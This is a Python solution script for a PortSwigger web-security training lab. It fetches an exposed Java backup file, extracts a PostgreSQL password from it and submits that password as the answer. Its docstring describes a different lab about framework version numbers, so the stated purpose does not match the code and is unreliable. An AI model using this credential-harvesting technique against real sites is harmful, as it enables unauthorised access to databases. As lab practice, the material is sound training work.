#!/usr/bin/env python


'''This lab's verbose error messages reveal that it is using a vulnerable version of a third-party framework. To solve the lab, obtain and submit the version number of this framework.

Lab link: https://portswigger.net/web-security/information-disclosure/exploiting/lab-infoleak-via-backup-files
'''

import requests

lab_id = '0a3c00b10439f84681c875c400cf007a' # change according to generated lab_id

# The hidden /backup endpoint contain a SQL config file with the information we need
uri = f"https://{lab_id}.web-security-academy.net/backup/ProductTemplate.java.bak"
r = requests.get(uri)
sql_pass = r.text.splitlines()[35].strip().strip('\"')
print(f"Found postgresql password: {sql_pass}")

# Post the sql password to finish the lab
uri = f"https://{lab_id}.web-security-academy.net/submitSolution"
data = { 'answer' : sql_pass }
r2 = requests.post(uri, data=data)
print('finished')